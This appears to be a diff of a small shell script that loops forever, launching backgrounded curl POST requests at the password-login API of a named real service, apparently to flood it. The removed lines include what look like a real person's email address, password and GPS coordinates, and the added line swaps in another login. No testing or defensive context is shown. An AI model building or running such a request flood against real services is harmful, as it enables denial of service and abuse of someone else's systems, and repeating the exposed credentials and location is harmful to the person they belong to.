@@ -10,11 +10,8 @@ ctrl_c() {
 
 while true
 do
- curl -i -s -k -X $'POST' \
-    -H $'user-agent: Dart/3.1 (dart:io)' -H $'content-type: application/x-www-form-urlencoded; charset=utf-8' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Length: 89' -H $'host: app.tripy.mobi' -H $'Connection: close' \
-    --data-binary $'email=ozmanbarutcu%40gmail.com&password=123r&app=Management&lat=39.7794644&lon=32.8088291' \
-    $'https://app.tripy.mobi/api/auth/login-with-password?email=ozmanbarutcu%40gmail.com&password=123r&app=Management&lat=39.7794644&lon=32.8088291' &
+  curl --location --request POST 'https://app.tripy.mobi/api/auth/login-with-password?email=ahmet%40gmail.com&password=12345678&app=Postman&lat=39.939467218170364&lon=32.824049948033284' --header 'Accept: application/json' &
     echo "Paket $i:"
     i=$((i+1))
 done
- 
+
